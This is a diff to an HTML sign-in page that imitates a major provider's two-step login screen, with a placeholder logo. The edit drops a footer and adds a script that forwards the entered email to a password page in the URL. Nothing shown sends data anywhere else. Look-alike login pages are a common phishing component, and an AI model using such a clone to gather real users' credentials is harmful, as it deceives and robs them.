@@ -55,25 +55,24 @@
     button:hover {
       background-color: #1558b0;
     }
-    .footer {
-      margin-top: 24px;
-      font-size: 12px;
-      color: #5f6368;
-      text-align: center;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <img class="logo" src="https://via.placeholder.com/75x75?text=LOGO" alt="Logo">
     <h2>Sign in</h2>
-    <form action="password.html" method="get">
-      <input type="email" name="email" placeholder="Email or phone" required>
+    <form onsubmit="handleSubmit(event)">
+      <input type="email" id="emailInput" placeholder="Email or phone" required />
       <button type="submit">Next</button>
     </form>
-    <div class="footer">
-      Not your computer? Use Guest mode to sign in privately.
-    </div>
   </div>
+
+  <script>
+    function handleSubmit(event) {
+      event.preventDefault();
+      const email = document.getElementById('emailInput').value;
+      window.location.href = 'password.html?email=' + encodeURIComponent(email);
+    }
+  </script>
 </body>
 </html>
